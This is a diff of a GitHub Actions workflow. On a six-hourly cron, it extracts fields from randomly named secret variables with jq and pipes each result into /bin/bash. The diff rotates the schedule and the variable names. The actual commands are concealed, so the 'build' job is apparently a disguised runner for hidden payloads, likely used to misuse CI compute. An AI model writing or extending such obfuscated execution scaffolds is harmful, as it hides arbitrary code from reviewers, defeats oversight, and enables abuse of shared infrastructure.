@@ -2,25 +2,24 @@ name: wuhaoning3214
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 5/6 * * *'
+    - cron: '4 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wuhaoning3214
         env:
-          kl74687: ${{ secrets.kl74687 }}
+          kzrjn466: ${{ secrets.kzrjn466 }}
         run: |
-          echo $kl74687 | jq -r .afrnd7486 | /bin/bash
-          echo $z8083 | jq -r .ytb0029 | /bin/bash
-          echo $utzkd88134 | jq -r .qwwa2 | /bin/bash
-          echo $huev00205 | jq -r .tig0 | /bin/bash
-          echo $aw9 | jq -r .oy88509 | /bin/bash
-          echo $c260 | jq -r .ltl0244 | /bin/bash
-          echo $j5 | jq -r .nxv6 | /bin/bash
-          echo $hw08 | jq -r .c943 | /bin/bash
-          echo $cso43 | jq -r .xwpyi86084 | /bin/bash
-          echo $prc7 | jq -r .kete1698 | /bin/bash
+          echo $kzrjn466 | jq -r .t4801 | /bin/bash
+          echo $gayg336 | jq -r .sq3 | /bin/bash
+          echo $jljnf3571 | jq -r .pxab38018 | /bin/bash
+          echo $ah6 | jq -r .ldy222 | /bin/bash
+          echo $ixmbs00 | jq -r .h74 | /bin/bash
+          echo $jwx8 | jq -r .ir0402 | /bin/bash
+          echo $zy0 | jq -r .auy9090 | /bin/bash
+          echo $utgov6607 | jq -r .pxkot18528 | /bin/bash
+          echo $psvre9435 | jq -r .qh81173 | /bin/bash
 
